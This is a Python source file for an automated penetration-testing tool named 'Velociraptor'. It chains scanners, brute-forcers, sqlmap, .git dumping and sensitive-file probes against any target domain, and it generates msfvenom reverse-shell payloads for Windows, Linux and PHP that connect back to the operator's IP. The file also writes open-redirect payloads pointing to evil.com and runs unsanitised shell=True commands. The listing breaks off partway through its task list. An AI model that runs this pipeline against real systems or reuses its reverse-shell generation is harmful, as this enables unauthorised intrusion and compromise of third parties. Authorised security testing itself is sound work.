#!/usr/bin/env python3
"""
Velociraptor - Automated Penetration Testing Reconnaissance Tool
A comprehensive library for automating various penetration testing tasks.
"""

import os
import sys
import subprocess
import shutil
import time
import json
import requests
import socket
import threading
from pathlib import Path
from typing import List, Dict, Optional, Tuple
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('velociraptor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Velociraptor:
    """Main Velociraptor class for penetration testing automation."""
    
    def __init__(self, target_domain: str):
        """
        Initialize Velociraptor with target domain.
        
        Args:
            target_domain (str): The target domain to perform recon on
        """
        self.target_domain = target_domain
        self.base_dir = f"Velociraptor_{target_domain}"
        self.local_ip = self._get_local_ip()
        self.tools_status = {}
        
        # Get Windows-specific paths
        self.is_windows = os.name == 'nt'
        self.user_home = os.path.expanduser('~')
        self.tools_dir = os.environ.get('VELOCIRAPTOR_TOOLS_DIR', os.path.join(self.user_home, 'velociraptor-tools'))
        self.go_bin = os.path.join(self.user_home, 'go', 'bin')
        
        # Define required tools and their installation commands with Windows support
        self.required_tools = {
            'subfinder': {
                'apt': 'subfinder', 
                'check': 'subfinder -version',
                'windows_check': f'{self.go_bin}\\subfinder.exe -version' if self.is_windows else 'subfinder -version'
            },
            'amass': {
                'apt': 'amass', 
                'check': 'amass -version',
                'windows_check': f'{self.go_bin}\\amass.exe -version' if self.is_windows else 'amass -version'
            },
            'nmap': {
                'apt': 'nmap', 
                'check': 'nmap -V',
                'windows_check': 'nmap -V'
            },
            'masscan': {
                'apt': 'masscan', 
                'check': 'masscan -V',
                'windows_check': 'masscan -V'
            },
            'eyewitness': {
                'pip': 'eyewitness', 
                'check': 'eyewitness --help',
                'windows_check': 'eyewitness --help'
            },
            'ffuf': {
                'go': 'go install github.com/ffuf/ffuf@latest', 
                'check': 'ffuf -V',
                'windows_check': f'{self.go_bin}\\ffuf.exe -V' if self.is_windows else 'ffuf -V'
            },
            'gobuster': {
                'apt': 'gobuster', 
                'check': 'gobuster version',
                'windows_check': f'{self.go_bin}\\gobuster.exe version' if self.is_windows else 'gobuster version'
            },
            'linkfinder': {
                'git': 'git clone https://github.com/GerbenJavado/LinkFinder.git', 
                'check': 'python3 LinkFinder/linkfinder.py --help',
                'windows_check': f'python {os.path.join(self.tools_dir, "LinkFinder", "linkfinder.py")} --help' if self.is_windows else 'python3 LinkFinder/linkfinder.py --help'
            },
            'dalfox': {
                'go': 'go install github.com/hahwul/dalfox/v2@latest', 
                'check': 'dalfox version',
                'windows_check': f'{self.go_bin}\\dalfox.exe version' if self.is_windows else 'dalfox version'
            },
            'sqlmap': {
                'apt': 'sqlmap', 
                'check': 'sqlmap --version',
                'windows_check': 'sqlmap --version'
            },
            'nikto': {
                'apt': 'nikto', 
                'check': 'nikto -Version',
                'windows_check': 'nikto -Version'
            },
            'httpx': {
                'go': 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest', 
                'check': 'httpx -version',
                'windows_check': f'{self.go_bin}\\httpx.exe -version' if self.is_windows else 'httpx -version'
            },
            'gau': {
                'go': 'go install github.com/lc/gau/v2/cmd/gau@latest', 
                'check': 'gau --version',
                'windows_check': f'{self.go_bin}\\gau.exe --version' if self.is_windows else 'gau --version'
            },
            'wafw00f': {
                'apt': 'wafw00f', 
                'check': 'wafw00f --version',
                'windows_check': 'wafw00f --version'
            },
            'arjun': {
                'pip': 'arjun', 
                'check': 'arjun --help',
                'windows_check': 'arjun --help'
            },
            'interactsh-client': {
                'go': 'go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest', 
                'check': 'interactsh-client -version',
                'windows_check': f'{self.go_bin}\\interactsh-client.exe -version' if self.is_windows else 'interactsh-client -version'
            },
            'oralyzer': {
                'go': 'go install github.com/hakluke/hakrawler@latest', 
                'check': 'hakrawler --help',
                'windows_check': f'{self.go_bin}\\hakrawler.exe --help' if self.is_windows else 'hakrawler --help'
            },
            'waybackurls': {
                'go': 'go install github.com/tomnomnom/waybackurls@latest', 
                'check': 'waybackurls --help',
                'windows_check': f'{self.go_bin}\\waybackurls.exe --help' if self.is_windows else 'waybackurls --help'
            },
            'msfvenom': {
                'apt': 'metasploit-framework', 
                'check': 'msfvenom --help',
                'windows_check': 'msfvenom --help'
            },
            'assetfinder': {
                'go': 'go install github.com/tomnomnom/assetfinder@latest', 
                'check': 'assetfinder --help',
                'windows_check': f'{self.go_bin}\\assetfinder.exe --help' if self.is_windows else 'assetfinder --help'
            },
            'gf': {
                'go': 'go install github.com/tomnomnom/gf@latest', 
                'check': 'gf --help',
                'windows_check': f'{self.go_bin}\\gf.exe --help' if self.is_windows else 'gf --help'
            },
            'gospider': {
                'go': 'go install github.com/jaeles-project/gospider@latest', 
                'check': 'gospider --help',
                'windows_check': f'{self.go_bin}\\gospider.exe --help' if self.is_windows else 'gospider --help'
            },
            'nuclei': {
                'go': 'go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest', 
                'check': 'nuclei -version',
                'windows_check': f'{self.go_bin}\\nuclei.exe -version' if self.is_windows else 'nuclei -version'
            },
            'httprobe': {
                'go': 'go install github.com/tomnomnom/httprobe@latest', 
                'check': 'httprobe --help',
                'windows_check': f'{self.go_bin}\\httprobe.exe --help' if self.is_windows else 'httprobe --help'
            },
            'meg': {
                'go': 'go install github.com/tomnomnom/meg@latest', 
                'check': 'meg --help',
                'windows_check': f'{self.go_bin}\\meg.exe --help' if self.is_windows else 'meg --help'
            },
            'unfurl': {
                'go': 'go install github.com/tomnomnom/unfurl@latest', 
                'check': 'unfurl --help',
                'windows_check': f'{self.go_bin}\\unfurl.exe --help' if self.is_windows else 'unfurl --help'
            },
            'anew': {
                'go': 'go install github.com/tomnomnom/anew@latest', 
                'check': 'anew --help',
                'windows_check': f'{self.go_bin}\\anew.exe --help' if self.is_windows else 'anew --help'
            },
            'qsreplace': {
                'go': 'go install github.com/tomnomnom/qsreplace@latest', 
                'check': 'qsreplace --help',
                'windows_check': f'{self.go_bin}\\qsreplace.exe --help' if self.is_windows else 'qsreplace --help'
            }
        }

        # Define folder structure
        self.folders = [
            'subdomain_enumeration',
            'port_scan',
            'screenshot_capture',
            'directory_bruteforce',
            'javascript_analysis',
            'parameter_discovery',
            'xss_detection',
            'sql_injection',
            'ssrf_discovery',
            'lfi_rfi_detection',
            'open_redirect_detection',
            'security_headers_check',
            'api_recon',
            'content_discovery',
            's3_bucket_enumeration',
            'cms_enumeration',
            'waf_detection',
            'information_disclosure',
            'reverse_shell_generation',
            'mass_exploitation',
            'vulnerability_scanning',
            'subdomain_takeover',
            'endpoint_analysis',
            'technology_detection'
        ]
    
    def _get_local_ip(self) -> str:
        """Get local IP address."""
        try:
            # Try to get IP from socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            try:
                # Fallback to ifconfig/ip command
                result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    return result.stdout.split()[6]
            except:
                pass
        return "127.0.0.1"
    
    def _run_command(self, command: str, cwd: str = None, timeout: int = 300) -> Tuple[int, str, str]:
        """
        Run a shell command and return the result.
        
        Args:
            command (str): Command to run
            cwd (str): Working directory
            timeout (int): Command timeout in seconds
            
        Returns:
            Tuple[int, str, str]: (return_code, stdout, stderr)
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                cwd=cwd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            logger.error(f"Command timed out: {command}")
            return -1, "", "Command timed out"
        except Exception as e:
            logger.error(f"Error running command {command}: {e}")
            return -1, "", str(e)
    
    def _check_tool_installed(self, tool: str, check_command: str) -> bool:
        """Check if a tool is installed."""
        try:
            # Use Windows-specific check command if available
            if self.is_windows and 'windows_check' in self.required_tools[tool]:
                check_command = self.required_tools[tool]['windows_check']
            
            result = subprocess.run(check_command, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def install_dependencies(self) -> bool:
        """Install all required dependencies."""
        logger.info("Checking and installing required dependencies...")
        
        for tool, config in self.required_tools.items():
            logger.info(f"Checking {tool}...")
            
            # Use appropriate check command
            check_command = config.get('windows_check', config['check']) if self.is_windows else config['check']
            
            if self._check_tool_installed(tool, check_command):
                logger.info(f"✓ {tool} is already installed")
                self.tools_status[tool] = True
                continue
            
            logger.info(f"Installing {tool}...")
            success = False
            
            # Try apt installation first (Linux only)
            if not self.is_windows and 'apt' in config:
                returncode, stdout, stderr = self._run_command(f"sudo apt update && sudo apt install -y {config['apt']}")
                if returncode == 0:
                    success = True
                    logger.info(f"✓ {tool} installed via apt")
            
            # Try pip installation
            elif 'pip' in config:
                pip_cmd = "python -m pip install" if self.is_windows else "pip3 install"
                returncode, stdout, stderr = self._run_command(f"{pip_cmd} {config['pip']}")
                if returncode == 0:
                    success = True
                    logger.info(f"✓ {tool} installed via pip")
            
            # Try go installation
            elif 'go' in config:
                returncode, stdout, stderr = self._run_command(config['go'])
                if returncode == 0:
                    success = True
                    logger.info(f"✓ {tool} installed via go")
            
            # Try git clone
            elif 'git' in config:
                # For Windows, clone to tools directory
                if self.is_windows:
                    repo_name = config['git'].split('/')[-1].replace('.git', '')
                    clone_path = os.path.join(self.tools_dir, repo_name)
                    if os.path.exists(clone_path):
                        # Update existing repository
                        returncode, stdout, stderr = self._run_command("git pull", cwd=clone_path)
                    else:
                        # Clone new repository
                        returncode, stdout, stderr = self._run_command(f"{config['git']} {clone_path}")
                else:
                    returncode, stdout, stderr = self._run_command(config['git'])
                
                if returncode == 0:
                    success = True
                    logger.info(f"✓ {tool} installed via git")
            
            if success:
                self.tools_status[tool] = True
            else:
                logger.warning(f"✗ Failed to install {tool}")
                self.tools_status[tool] = False
        
        return all(self.tools_status.values())
    
    def create_folder_structure(self):
        """Create the folder structure for organizing results."""
        logger.info(f"Creating folder structure in {self.base_dir}...")
        
        # Create main directory
        os.makedirs(self.base_dir, exist_ok=True)
        
        # Create subdirectories
        for folder in self.folders:
            folder_path = os.path.join(self.base_dir, folder)
            os.makedirs(folder_path, exist_ok=True)
            logger.info(f"Created directory: {folder_path}")
        
        # Create a summary file
        summary_file = os.path.join(self.base_dir, "recon_summary.md")
        with open(summary_file, 'w') as f:
            f.write(f"# Velociraptor Reconnaissance Report\n\n")
            f.write(f"**Target Domain:** {self.target_domain}\n")
            f.write(f"**Scan Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"**Local IP:** {self.local_ip}\n\n")
            f.write("## Scan Results\n\n")
        
        logger.info("✓ Folder structure created successfully")
    
    def subdomain_enumeration(self):
        """Perform subdomain enumeration."""
        logger.info("Starting subdomain enumeration...")
        folder = os.path.join(self.base_dir, 'subdomain_enumeration')
        
        subdomains = set()
        
        # Subfinder
        if self.tools_status.get('subfinder', False):
            logger.info("Running subfinder...")
            cmd = f"subfinder -d {self.target_domain} -o {folder}/subfinder.txt"
            returncode, stdout, stderr = self._run_command(cmd, cwd=folder)
            if returncode == 0 and os.path.exists(f"{folder}/subfinder.txt"):
                try:
                    with open(f"{folder}/subfinder.txt", 'r') as f:
                        subdomains.update(f.read().splitlines())
                except Exception as e:
                    logger.error(f"Error reading subfinder results: {e}")
        
        # Amass
        if self.tools_status.get('amass', False):
            logger.info("Running amass...")
            cmd = f"amass enum -d {self.target_domain} -o {folder}/amass.txt"
            returncode, stdout, stderr = self._run_command(cmd, cwd=folder)
            if returncode == 0 and os.path.exists(f"{folder}/amass.txt"):
                try:
                    with open(f"{folder}/amass.txt", 'r') as f:
                        subdomains.update(f.read().splitlines())
                except Exception as e:
                    logger.error(f"Error reading amass results: {e}")
        
        # Assetfinder
        if self.tools_status.get('assetfinder', False):
            logger.info("Running assetfinder...")
            cmd = f"assetfinder {self.target_domain} > {folder}/assetfinder.txt"
            returncode, stdout, stderr = self._run_command(cmd, cwd=folder)
            if returncode == 0 and os.path.exists(f"{folder}/assetfinder.txt"):
                try:
                    with open(f"{folder}/assetfinder.txt", 'r') as f:
                        subdomains.update(f.read().splitlines())
                except Exception as e:
                    logger.error(f"Error reading assetfinder results: {e}")
        
        # Save unique subdomains
        if subdomains:
            try:
                with open(f"{folder}/all_subdomains.txt", 'w') as f:
                    for subdomain in sorted(subdomains):
                        if subdomain.strip():  # Only write non-empty lines
                            f.write(f"{subdomain.strip()}\n")
                
                logger.info(f"✓ Found {len(subdomains)} unique subdomains")
            except Exception as e:
                logger.error(f"Error writing subdomains file: {e}")
        else:
            logger.warning("No subdomains found")
            # Create empty file to prevent errors
            try:
                with open(f"{folder}/all_subdomains.txt", 'w') as f:
                    f.write(f"{self.target_domain}\n")  # At least include the main domain
                logger.info("Created subdomains file with main domain only")
            except Exception as e:
                logger.error(f"Error creating subdomains file: {e}")
    
    def port_scanning(self):
        """Perform port scanning."""
        logger.info("Starting port scanning...")
        folder = os.path.join(self.base_dir, 'port_scan')
        
        # Read subdomains if available
        subdomains_file = os.path.join(self.base_dir, 'subdomain_enumeration', 'all_subdomains.txt')
        targets = [self.target_domain]
        
        if os.path.exists(subdomains_file):
            with open(subdomains_file, 'r') as f:
                targets.extend(f.read().splitlines())
        
        # Nmap scan
        if self.tools_status.get('nmap', False):
            logger.info("Running nmap scan...")
            for target in targets[:10]:  # Limit to first 10 targets
                cmd = f"nmap -sS -sV -O -p- {target} -oN {folder}/nmap_{target.replace('.', '_')}.txt"
                self._run_command(cmd, cwd=folder)
        
        # Masscan for fast scanning
        if self.tools_status.get('masscan', False):
            logger.info("Running masscan...")
            cmd = f"masscan {self.target_domain} -p1-65535 --rate=1000 -oJ {folder}/masscan.json"
            self._run_command(cmd, cwd=folder)
    
    def screenshot_capture(self):
        """Capture screenshots of discovered subdomains."""
        logger.info("Starting screenshot capture...")
        folder = os.path.join(self.base_dir, 'screenshot_capture')
        
        # Read subdomains
        subdomains_file = os.path.join(self.base_dir, 'subdomain_enumeration', 'all_subdomains.txt')
        if not os.path.exists(subdomains_file):
            logger.warning("No subdomains found for screenshot capture")
            return
        
        with open(subdomains_file, 'r') as f:
            subdomains = f.read().splitlines()
        
        # Eyewitness
        if self.tools_status.get('eyewitness', False):
            logger.info("Running eyewitness...")
            with open(f"{folder}/urls.txt", 'w') as f:
                for subdomain in subdomains:
                    f.write(f"http://{subdomain}\n")
                    f.write(f"https://{subdomain}\n")
            
            cmd = f"eyewitness --web -f {folder}/urls.txt -d {folder}/eyewitness"
            self._run_command(cmd, cwd=folder)
        
        # Aquatone
        if self.tools_status.get('aquatone', False):
            logger.info("Running aquatone...")
            with open(f"{folder}/aquatone_urls.txt", 'w') as f:
                for subdomain in subdomains:
                    f.write(f"{subdomain}\n")
            
            cmd = f"cat {folder}/aquatone_urls.txt | aquatone -out {folder}/aquatone"
            self._run_command(cmd, cwd=folder)
    
    def directory_bruteforce(self):
        """Perform directory brute-forcing."""
        logger.info("Starting directory brute-forcing...")
        folder = os.path.join(self.base_dir, 'directory_bruteforce')
        
        # Common wordlists
        wordlists = [
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
        ]
        
        # Read subdomains
        subdomains_file = os.path.join(self.base_dir, 'subdomain_enumeration', 'all_subdomains.txt')
        targets = [self.target_domain]
        
        if os.path.exists(subdomains_file):
            with open(subdomains_file, 'r') as f:
                targets.extend(f.read().splitlines())
        
        # FFUF
        if self.tools_status.get('ffuf', False):
            logger.info("Running ffuf...")
            for target in targets[:5]:  # Limit to first 5 targets
                for wordlist in wordlists:
                    if os.path.exists(wordlist):
                        cmd = f"ffuf -u http://{target}/FUZZ -w {wordlist} -o {folder}/ffuf_{target.replace('.', '_')}.json"
                        self._run_command(cmd, cwd=folder)
                        break
        
        # Gobuster
        if self.tools_status.get('gobuster', False):
            logger.info("Running gobuster...")
            for target in targets[:5]:  # Limit to first 5 targets
                for wordlist in wordlists:
                    if os.path.exists(wordlist):
                        cmd = f"gobuster dir -u http://{target} -w {wordlist} -o {folder}/gobuster_{target.replace('.', '_')}.txt"
                        self._run_command(cmd, cwd=folder)
                        break
    
    def javascript_analysis(self):
        """Analyze JavaScript files for potential vulnerabilities."""
        logger.info("Starting JavaScript analysis...")
        folder = os.path.join(self.base_dir, 'javascript_analysis')
        
        # Gospider to crawl and find JS files
        if self.tools_status.get('gospider', False):
            logger.info("Running gospider...")
            cmd = f"gospider -s https://{self.target_domain} -o {folder} -c 10 -d 3"
            self._run_command(cmd, cwd=folder)
        
        # Linkfinder for JS analysis
        if self.tools_status.get('linkfinder', False):
            logger.info("Running linkfinder...")
            js_files = []
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.endswith('.js'):
                        js_files.append(os.path.join(root, file))
            
            for js_file in js_files[:10]:  # Limit to first 10 files
                cmd = f"python3 LinkFinder/linkfinder.py -i {js_file} -o {folder}/linkfinder_{os.path.basename(js_file)}.html"
                self._run_command(cmd, cwd=folder)
    
    def parameter_discovery(self):
        """Discover parameters in web applications."""
        logger.info("Starting parameter discovery...")
        folder = os.path.join(self.base_dir, 'parameter_discovery')
        
        # Paramspider
        if self.tools_status.get('paramspider', False):
            logger.info("Running paramspider...")
            cmd = f"python3 ParamSpider/paramspider.py --domain {self.target_domain} --output {folder}/paramspider.txt"
            self._run_command(cmd, cwd=folder)
        
        # Arjun
        if self.tools_status.get('arjun', False):
            logger.info("Running arjun...")
            cmd = f"arjun -u https://{self.target_domain} -oJ {folder}/arjun.json"
            self._run_command(cmd, cwd=folder)
    
    def xss_detection(self):
        """Detect XSS vulnerabilities."""
        logger.info("Starting XSS detection...")
        folder = os.path.join(self.base_dir, 'xss_detection')
        
        # Dalfox
        if self.tools_status.get('dalfox', False):
            logger.info("Running dalfox...")
            cmd = f"dalfox url https://{self.target_domain} -o {folder}/dalfox.txt"
            self._run_command(cmd, cwd=folder)
        
        # XSStrike
        if self.tools_status.get('xsstrike', False):
            logger.info("Running XSStrike...")
            cmd = f"python3 XSStrike/xsstrike.py -u https://{self.target_domain} --output {folder}/xsstrike.txt"
            self._run_command(cmd, cwd=folder)
    
    def sql_injection(self):
        """Detect SQL injection vulnerabilities."""
        logger.info("Starting SQL injection detection...")
        folder = os.path.join(self.base_dir, 'sql_injection')
        
        # SQLMap
        if self.tools_status.get('sqlmap', False):
            logger.info("Running sqlmap...")
            cmd = f"sqlmap -u https://{self.target_domain} --batch --random-agent --output-dir {folder}/sqlmap"
            self._run_command(cmd, cwd=folder)
    
    def ssrf_discovery(self):
        """Discover SSRF vulnerabilities."""
        logger.info("Starting SSRF discovery...")
        folder = os.path.join(self.base_dir, 'ssrf_discovery')
        
        # Gopherus
        if self.tools_status.get('gopherus', False):
            logger.info("Running gopherus...")
            cmd = f"python3 Gopherus/gopherus.py --url https://{self.target_domain}"
            self._run_command(cmd, cwd=folder)
    
    def lfi_rfi_detection(self):
        """Detect LFI/RFI vulnerabilities."""
        logger.info("Starting LFI/RFI detection...")
        folder = os.path.join(self.base_dir, 'lfi_rfi_detection')
        
        # Fimap
        if self.tools_status.get('fimap', False):
            logger.info("Running fimap...")
            cmd = f"fimap -u https://{self.target_domain} -o {folder}/fimap.txt"
            self._run_command(cmd, cwd=folder)
    
    def open_redirect_detection(self):
        """Detect open redirect vulnerabilities."""
        logger.info("Starting open redirect detection...")
        folder = os.path.join(self.base_dir, 'open_redirect_detection')
        
        # Use custom script for open redirect detection
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>"
        ]
        
        with open(f"{folder}/redirect_payloads.txt", 'w') as f:
            for payload in redirect_payloads:
                f.write(f"{payload}\n")
    
    def security_headers_check(self):
        """Check security headers."""
        logger.info("Starting security headers check...")
        folder = os.path.join(self.base_dir, 'security_headers_check')
        
        # Nikto
        if self.tools_status.get('nikto', False):
            logger.info("Running nikto...")
            cmd = f"nikto -h https://{self.target_domain} -output {folder}/nikto.txt"
            self._run_command(cmd, cwd=folder)
        
        # Custom security headers check
        try:
            response = requests.get(f"https://{self.target_domain}", timeout=10)
            headers = response.headers
            
            with open(f"{folder}/security_headers.txt", 'w') as f:
                f.write("Security Headers Analysis\n")
                f.write("=" * 30 + "\n\n")
                
                security_headers = [
                    'X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection',
                    'Strict-Transport-Security', 'Content-Security-Policy',
                    'Referrer-Policy', 'Permissions-Policy'
                ]
                
                for header in security_headers:
                    if header in headers:
                        f.write(f"✓ {header}: {headers[header]}\n")
                    else:
                        f.write(f"✗ {header}: Missing\n")
        except Exception as e:
            logger.error(f"Error checking security headers: {e}")
    
    def api_recon(self):
        """Perform API reconnaissance."""
        logger.info("Starting API reconnaissance...")
        folder = os.path.join(self.base_dir, 'api_recon')
        
        # Kiterunner
        if self.tools_status.get('kiterunner', False):
            logger.info("Running kiterunner...")
            cmd = f"kr scan {self.target_domain} -o {folder}/kiterunner.txt"
            self._run_command(cmd, cwd=folder)
    
    def content_discovery(self):
        """Discover additional content."""
        logger.info("Starting content discovery...")
        folder = os.path.join(self.base_dir, 'content_discovery')
        
        # GAU
        if self.tools_status.get('gau', False):
            logger.info("Running gau...")
            cmd = f"gau {self.target_domain} > {folder}/gau.txt"
            self._run_command(cmd, cwd=folder)
        
        # Waybackurls
        if self.tools_status.get('waybackurls', False):
            logger.info("Running waybackurls...")
            cmd = f"waybackurls {self.target_domain} > {folder}/waybackurls.txt"
            self._run_command(cmd, cwd=folder)
    
    def s3_bucket_enumeration(self):
        """Enumerate S3 buckets."""
        logger.info("Starting S3 bucket enumeration...")
        folder = os.path.join(self.base_dir, 's3_bucket_enumeration')
        
        # Custom S3 bucket enumeration
        bucket_names = [
            f"{self.target_domain}",
            f"www.{self.target_domain}",
            f"dev.{self.target_domain}",
            f"staging.{self.target_domain}",
            f"prod.{self.target_domain}",
            f"backup.{self.target_domain}",
            f"assets.{self.target_domain}",
            f"static.{self.target_domain}",
            f"media.{self.target_domain}",
            f"uploads.{self.target_domain}"
        ]
        
        with open(f"{folder}/bucket_names.txt", 'w') as f:
            for bucket in bucket_names:
                f.write(f"{bucket}\n")
        
        # Check bucket access
        for bucket in bucket_names:
            try:
                response = requests.get(f"http://{bucket}.s3.amazonaws.com", timeout=5)
                with open(f"{folder}/accessible_buckets.txt", 'a') as f:
                    f.write(f"{bucket}: {response.status_code}\n")
            except:
                pass
    
    def cms_enumeration(self):
        """Enumerate CMS."""
        logger.info("Starting CMS enumeration...")
        folder = os.path.join(self.base_dir, 'cms_enumeration')
        
        # CMSeek
        if self.tools_status.get('cmseek', False):
            logger.info("Running cmseek...")
            cmd = f"python3 CMSeeK/cmseek.py -u https://{self.target_domain} --output {folder}/cmseek"
            self._run_command(cmd, cwd=folder)
    
    def waf_detection(self):
        """Detect WAF."""
        logger.info("Starting WAF detection...")
        folder = os.path.join(self.base_dir, 'waf_detection')
        
        # Wafw00f
        if self.tools_status.get('wafw00f', False):
            logger.info("Running wafw00f...")
            cmd = f"wafw00f https://{self.target_domain} -o {folder}/wafw00f.txt"
            self._run_command(cmd, cwd=folder)
    
    def information_disclosure(self):
        """Check for information disclosure."""
        logger.info("Starting information disclosure check...")
        folder = os.path.join(self.base_dir, 'information_disclosure')
        
        # GitDumper
        if self.tools_status.get('gitdumper', False):
            logger.info("Running gitdumper...")
            cmd = f"python3 git-dumper/git-dumper.py https://{self.target_domain}/.git {folder}/git_dump"
            self._run_command(cmd, cwd=folder)
        
        # Check common sensitive files
        sensitive_files = [
            "/robots.txt", "/sitemap.xml", "/.env", "/config.php",
            "/wp-config.php", "/.git/config", "/.svn/entries",
            "/backup.zip", "/admin", "/phpinfo.php"
        ]
        
        with open(f"{folder}/sensitive_files.txt", 'w') as f:
            for file_path in sensitive_files:
                try:
                    response = requests.get(f"https://{self.target_domain}{file_path}", timeout=5)
                    f.write(f"{file_path}: {response.status_code}\n")
                except:
                    f.write(f"{file_path}: Error\n")
    
    def reverse_shell_generation(self):
        """Generate reverse shells."""
        logger.info("Starting reverse shell generation...")
        folder = os.path.join(self.base_dir, 'reverse_shell_generation')
        
        # MSFvenom
        if self.tools_status.get('msfvenom', False):
            logger.info("Generating reverse shells with msfvenom...")
            
            # Windows reverse shell
            cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={self.local_ip} LPORT=4444 -f exe > {folder}/windows_reverse.exe"
            self._run_command(cmd, cwd=folder)
            
            # Linux reverse shell
            cmd = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={self.local_ip} LPORT=4444 -f elf > {folder}/linux_reverse.elf"
            self._run_command(cmd, cwd=folder)
            
            # PHP reverse shell
            cmd = f"msfvenom -p php/reverse_php LHOST={self.local_ip} LPORT=4444 -f raw > {folder}/php_reverse.php"
            self._run_command(cmd, cwd=folder)
    
    def mass_exploitation(self):
        """Perform mass exploitation with Metasploit."""
        logger.info("Starting mass exploitation...")
        folder = os.path.join(self.base_dir, 'mass_exploitation')
        
        # Create Metasploit resource script
        with open(f"{folder}/exploit.rc", 'w') as f:
            f.write(f"use auxiliary/scanner/portscan/tcp\n")
            f.write(f"set RHOSTS {self.target_domain}\n")
            f.write(f"set PORTS 80,443,22,21,25,53,110,143,993,995\n")
            f.write(f"run\n")
            f.write(f"exit\n")
        
        # Run Metasploit
        if self.tools_status.get('msfvenom', False):
            cmd = f"msfconsole -r {folder}/exploit.rc -o {folder}/msf_output.txt"
            self._run_command(cmd, cwd=folder)
    
    def vulnerability_scanning(self):
        """Perform comprehensive vulnerability scanning."""
        logger.info("Starting vulnerability scanning...")
        folder = os.path.join(self.base_dir, 'vulnerability_scanning')
        
        # Nuclei
        if self.tools_status.get('nuclei', False):
            logger.info("Running nuclei...")
            cmd = f"nuclei -u https://{self.target_domain} -o {folder}/nuclei.txt"
            self._run_command(cmd, cwd=folder)
    
    def subdomain_takeover(self):
        """Check for subdomain takeover opportunities."""
        logger.info("Starting subdomain takeover check...")
        folder = os.path.join(self.base_dir, 'subdomain_takeover')
        
        # Subjack
        if self.tools_status.get('subjack', False):
            logger.info("Running subjack...")
            subdomains_file = os.path.join(self.base_dir, 'subdomain_enumeration', 'all_subdomains.txt')
            if os.path.exists(subdomains_file):
                cmd = f"subjack -d {subdomains_file} -o {folder}/subjack.txt"
                self._run_command(cmd, cwd=folder)
    
    def endpoint_analysis(self):
        """Analyze discovered endpoints."""
        logger.info("Starting endpoint analysis...")
        folder = os.path.join(self.base_dir, 'endpoint_analysis')
        
        # Combine all discovered URLs
        url_sources = [
            os.path.join(self.base_dir, 'content_discovery', 'gau.txt'),
            os.path.join(self.base_dir, 'content_discovery', 'waybackurls.txt'),
            os.path.join(self.base_dir, 'directory_bruteforce', 'ffuf_*.json'),
            os.path.join(self.base_dir, 'directory_bruteforce', 'gobuster_*.txt')
        ]
        
        all_urls = set()
        for source in url_sources:
            if os.path.exists(source):
                with open(source, 'r') as f:
                    all_urls.update(f.read().splitlines())
        
        # Save unique URLs
        with open(f"{folder}/all_endpoints.txt", 'w') as f:
            for url in sorted(all_urls):
                f.write(f"{url}\n")
    
    def technology_detection(self):
        """Detect technologies used by the target."""
        logger.info("Starting technology detection...")
        folder = os.path.join(self.base_dir, 'technology_detection')
        
        try:
            response = requests.get(f"https://{self.target_domain}", timeout=10)
            headers = response.headers
            
            with open(f"{folder}/technologies.txt", 'w') as f:
                f.write("Technology Detection Results\n")
                f.write("=" * 30 + "\n\n")
                
                # Check common technology indicators
                tech_indicators = {
                    'Server': 'Web Server',
                    'X-Powered-By': 'Framework/Technology',
                    'X-AspNet-Version': 'ASP.NET',
                    'X-Runtime': 'Ruby on Rails',
                    'X-Drupal-Cache': 'Drupal',
                    'X-Generator': 'CMS/Framework',
                    'X-WP-Super-Cache': 'WordPress',
                    'X-Shopify-Stage': 'Shopify'
                }
                
                for header, tech in tech_indicators.items():
                    if header in headers:
                        f.write(f"{tech}: {headers[header]}\n")
                
                # Check for common frameworks in HTML
                html = response.text.lower()
                frameworks = ['wordpress', 'drupal', 'joomla', 'magento', 'shopify', 'laravel', 'django', 'flask', 'express', 'angular', 'react', 'vue']
                
                f.write("\nFrameworks detected in HTML:\n")
                for framework in frameworks:
                    if framework in html:
                        f.write(f"- {framework}\n")
                        
        except Exception as e:
            logger.error(f"Error in technology detection: {e}")
    
    def run_full_recon(self):
        """Run the complete reconnaissance process."""
        logger.info("=" * 60)
        logger.info("VELOCIRAPTOR - AUTOMATED PENETRATION TESTING TOOL")
        logger.info("=" * 60)
        logger.info(f"Target Domain: {self.target_domain}")
        logger.info(f"Local IP: {self.local_ip}")
        logger.info("=" * 60)
        
        # Step 1: Install dependencies
        if not self.install_dependencies():
            logger.error("Failed to install all dependencies. Some tools may not work.")
        
        # Step 2: Create folder structure
        self.create_folder_structure()
        
        # Step 3: Run all recon tasks
        recon_tasks = [
            ("Subdomain Enumeration", self.subdomain_enumeration),
            ("Port Scanning", self.port_scanning),
            ("Screenshot Capture", self.screenshot_capture),
            ("Directory Brute-Forcing", self.directory_bruteforce),
            ("JavaScript Analysis", self.javascript_analysis),
            ("Parameter Discovery", self.parameter_discovery),
            ("XSS Detection", self.xss_detection),
            ("SQL Injection", self.sql_injection),
            ("SSRF Discovery", self.ssrf_discovery),
            ("LFI/RFI Detection", self.lfi_rfi_detection),
            ("Open Redirect Detection", self.open_redirect_detection),
            ("Security Headers Check", self.security_headers_check),
            ("API Reconnaissance", self.api_recon),
            ("Content Discovery", self.content_discovery),
